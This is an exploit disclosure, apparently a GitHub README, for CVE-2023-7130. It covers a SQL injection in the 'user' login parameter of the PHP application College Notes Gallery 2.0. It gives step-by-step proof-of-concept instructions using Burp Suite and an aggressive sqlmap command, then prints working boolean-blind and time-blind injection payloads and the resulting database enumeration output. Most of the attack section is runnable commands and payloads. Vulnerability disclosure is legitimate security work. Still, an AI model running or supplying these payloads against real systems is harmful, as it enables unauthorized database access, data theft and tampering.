# CVE-2023-7130_College_Notes_Gallery-SQL_Injection
+ **Exploit Title:** CVE-2023-7130_College_Notes_Gallery-SQL_Injection
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevbens
+ **Vendor Homepage:** https://code-projects.org/college-notes-gallery-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/02/COLLEGE_NOTES_GALLERY_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 2.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-2023-7130

## References: 
+ **CVE-2023-7130:** https://vuldb.com/?id.249133
+ https://www.cve.org/CVERecord?id=CVE-2023-7130

## Description:
College Notes Gallery 2.0 allows SQL Injection via parameter 'user' in "/notes/login.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the login page: "http://localhost/notes/login.php"
+ Fill the username and password then click 'login' button.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Use sqlmap to exploit. In sqlmap, use 'user' parameter to dump the database. 
```
sqlmap -r r.txt -p user --risk 3 --level 5 --threads 1 --random-agent tamper=randomcase --dbms mysql --batch --current-db
```

```
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: user=test' OR NOT 7621=7621-- SdON&pass=test&login=login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=test' AND (SELECT 6983 FROM (SELECT(SLEEP(5)))KqgU)-- Reeu&pass=test&login=login
---
[16:16:28] [INFO] testing MySQL
[16:16:28] [INFO] confirming MySQL
[16:16:28] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[16:16:28] [INFO] fetching current database
[16:16:28] [INFO] resumed: notes
current database: 'notes'
```

+ current database: `notes`
![1](https://github.com/h4md153v63n/CVEs/assets/5091265/16752d90-2918-4777-884a-131dcd93b06e)
